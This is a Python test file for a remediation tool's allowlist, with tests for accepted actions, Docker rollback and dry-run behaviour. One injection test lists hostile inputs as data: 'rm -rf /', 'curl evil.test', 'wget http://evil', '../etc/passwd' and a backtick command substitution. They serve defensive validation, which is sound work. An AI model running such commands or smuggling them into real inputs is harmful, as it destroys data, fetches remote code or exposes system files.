"""Allowlist rejects unknown actions/services and injection attempts."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from remediation.actions import (
    ACTION_RESET_FAULT,
    ACTION_RESTART_SERVICE,
    ACTION_ROLLBACK_DEPLOY,
    Proposal,
    RemediationError,
    execute,
    parse_proposal,
    record_last_good,
    validate_proposal_fields,
)


def _block(action: str, target: str) -> str:
    return (
        "<!-- resilienceops-proposal:v1 -->\n"
        f"action: {action}\n"
        f"target: {target}\n"
        "<!-- /resilienceops-proposal -->\n"
    )


def test_accepts_three_allowlisted_actions():
    assert parse_proposal(_block("reset_fault", "order-service")).action == ACTION_RESET_FAULT
    assert parse_proposal(_block("restart_service", "payment-service")).target == "payment-service"
    assert parse_proposal(_block("rollback_deploy", "both")).action == ACTION_ROLLBACK_DEPLOY


def test_rejects_unknown_action():
    with pytest.raises(RemediationError, match="unknown action"):
        validate_proposal_fields("delete_bucket", "order-service")


def test_rejects_unknown_restart_service():
    with pytest.raises(RemediationError, match="not allowlisted"):
        validate_proposal_fields("restart_service", "postgres")
    with pytest.raises(RemediationError, match="not allowlisted"):
        validate_proposal_fields("restart_service", "redis")
    with pytest.raises(RemediationError, match="not allowlisted"):
        validate_proposal_fields("restart_service", "grafana")


def test_rejects_shell_and_path_injection():
    payloads = [
        _block("reset_fault; rm -rf /", "order-service"),
        _block("reset_fault", "order-service && curl evil.test"),
        _block("reset_fault", "../etc/passwd"),
        _block("reset_fault", "order-service;reboot"),
        "<!-- resilienceops-proposal:v1 -->\naction: reset_fault\ntarget: order-service\ncmd: wget http://evil\n<!-- /resilienceops-proposal -->\n",
        "<!-- resilienceops-proposal:v1 -->\naction: reset_fault\ntarget: `id`\n<!-- /resilienceops-proposal -->\n",
        "<!-- resilienceops-proposal:v1 -->\naction: reset_fault\ntarget: order-service\n<!-- /resilienceops-proposal -->\n<!-- resilienceops-proposal:v1 -->\naction: restart_service\ntarget: api-gw\n<!-- /resilienceops-proposal -->\n",
    ]
    for text in payloads:
        with pytest.raises(RemediationError):
            parse_proposal(text)


def test_rejects_extra_or_missing_fields():
    with pytest.raises(RemediationError):
        parse_proposal("<!-- resilienceops-proposal:v1 -->\naction: reset_fault\n<!-- /resilienceops-proposal -->\n")
    with pytest.raises(RemediationError):
        parse_proposal("just reset the fault please")


def test_dry_run_reset_does_not_call_http(monkeypatch):
    called = []

    def boom(*_a, **_k):
        called.append(True)
        raise AssertionError("HTTP must not run in dry-run")

    monkeypatch.setattr("remediation.actions._http_json", boom)
    result = execute(Proposal("reset_fault", "both"), dry_run=True)
    assert result.ok
    assert result.dry_run
    assert called == []
    assert {s["service"] for s in result.steps} == {"order-service", "payment-service"}


def test_execute_unknown_action_fails_closed():
    # Bypass validate_proposal_fields to prove execute still rejects.
    result = execute(Proposal("format_disk", "order-service"), dry_run=True)
    assert result.ok is False
    assert "unknown action" in (result.error or "")


def test_record_last_good_rejects_unknown_service(monkeypatch):
    monkeypatch.setattr("remediation.actions._container_image_id", lambda name: "sha256:" + "a" * 64)
    with pytest.raises(RemediationError, match="unknown service"):
        record_last_good(["not-a-service"])


def test_rollback_fails_closed_without_snapshot(tmp_path, monkeypatch):
    monkeypatch.setenv("REMEDIATION_STATE_DIR", str(tmp_path))
    result = execute(Proposal("rollback_deploy", "api-gw"), dry_run=True)
    assert result.ok is False
    assert "no last-good snapshot" in (result.error or "")


def test_http_json_wraps_connection_reset(monkeypatch):
    from remediation import actions as actions_mod

    def boom(*_a, **_k):
        raise ConnectionResetError("peer reset")

    monkeypatch.setattr(actions_mod, "urlopen", boom)
    with pytest.raises(RemediationError, match="request failed"):
        actions_mod._http_json("GET", "http://127.0.0.1:8001/health")


def test_rollback_dry_run_uses_snapshot(tmp_path, monkeypatch):
    monkeypatch.setenv("REMEDIATION_STATE_DIR", str(tmp_path))
    snapshot = {
        "recorded_at": "2026-10-24T00:00:00+00:00",
        "services": {
            "api-gw": {"image_id": "sha256:" + "b" * 64, "image_name": "lab-api-gw"},
            "order-service": {"image_id": "sha256:" + "c" * 64, "image_name": "lab-order-service"},
            "payment-service": {"image_id": "sha256:" + "d" * 64, "image_name": "lab-payment-service"},
        },
    }
    (tmp_path / "last_good_deploy.json").write_text(json.dumps(snapshot), encoding="utf-8")
    result = execute(Proposal("rollback_deploy", "order-service"), dry_run=True)
    assert result.ok
    assert result.steps[0]["image_id"].startswith("sha256:")
    assert result.steps[0]["image_ref"] == "lab-order-service:last-good"
    assert result.steps[0]["tag_argv"] == [
        "docker",
        "tag",
        snapshot["services"]["order-service"]["image_id"],
        "lab-order-service:last-good",
    ]
    assert "--no-build" in result.steps[0]["argv"]
    assert any("rollback-order-service.yml" in part for part in result.steps[0]["argv"])


def test_rollback_both_includes_all_three_app_services(tmp_path, monkeypatch):
    monkeypatch.setenv("REMEDIATION_STATE_DIR", str(tmp_path))
    ids = {name: "sha256:" + ch * 64 for name, ch in (("api-gw", "a"), ("order-service", "b"), ("payment-service", "c"))}
    (tmp_path / "last_good_deploy.json").write_text(
        json.dumps({"services": {n: {"image_id": i, "image_name": f"lab-{n}"} for n, i in ids.items()}}),
        encoding="utf-8",
    )
    result = execute(Proposal("rollback_deploy", "both"), dry_run=True)
    assert result.ok
    assert [s["service"] for s in result.steps] == ["api-gw", "order-service", "payment-service"]


def test_rollback_recreates_from_last_good_image(tmp_path, monkeypatch):
    """Tag last-good as the Compose image name, then up --no-build from the override."""
    from remediation import actions as actions_mod

    last_good = "sha256:" + "b" * 64
    current = "sha256:" + "c" * 64
    image_ref = "lab-order-service:last-good"
    monkeypatch.setenv("REMEDIATION_STATE_DIR", str(tmp_path))
    (tmp_path / "last_good_deploy.json").write_text(
        json.dumps(
            {
                "services": {
                    "order-service": {"image_id": last_good, "image_name": "lab-order-service"}
                }
            }
        ),
        encoding="utf-8",
    )
    calls: list[list[str]] = []

    def fake_run(argv, *, cwd=None):
        calls.append(list(argv))
        return {"argv": list(argv), "returncode": 0, "stdout": "", "stderr": ""}

    def fake_image(_name: str) -> str:
        tagged = any(argv[:3] == ["docker", "tag", last_good] and argv[3] == image_ref for argv in calls)
        for argv in calls:
            if "up" in argv and "--no-build" in argv:
                text = (tmp_path / "rollback-order-service.yml").read_text(encoding="utf-8")
                if image_ref in text and "pull_policy: never" in text and last_good not in text and tagged:
                    return last_good
        return current

    monkeypatch.setattr(actions_mod, "_run", fake_run)
    monkeypatch.setattr(actions_mod, "_container_image_id", fake_image)
    result = execute(Proposal("rollback_deploy", "order-service"), dry_run=False)
    assert result.ok, result.error
    override = (tmp_path / "rollback-order-service.yml").read_text(encoding="utf-8")
    assert f"image: {image_ref}" in override
    assert "pull_policy: never" in override
    assert last_good not in override
    assert any(argv[:3] == ["docker", "tag", last_good] and argv[3] == image_ref for argv in calls)
    assert any("up" in argv and "--no-build" in argv and "--force-recreate" in argv for argv in calls)
    assert result.steps[0]["image_after"] == last_good
    assert result.steps[0]["image_id"] == last_good
    assert result.steps[0]["image_after"] != current


def test_rollback_fails_if_running_image_stays_current(tmp_path, monkeypatch):
    from remediation import actions as actions_mod

    last_good = "sha256:" + "b" * 64
    current = "sha256:" + "c" * 64
    monkeypatch.setenv("REMEDIATION_STATE_DIR", str(tmp_path))
    (tmp_path / "last_good_deploy.json").write_text(
        json.dumps({"services": {"order-service": {"image_id": last_good}}}),
        encoding="utf-8",
    )
    monkeypatch.setattr(
        actions_mod,
        "_run",
        lambda argv, *, cwd=None: {"argv": list(argv), "returncode": 0, "stdout": "", "stderr": ""},
    )
    monkeypatch.setattr(actions_mod, "_container_image_id", lambda _name: current)
    result = execute(Proposal("rollback_deploy", "order-service"), dry_run=False)
    assert result.ok is False
    assert "did not switch" in (result.error or "")
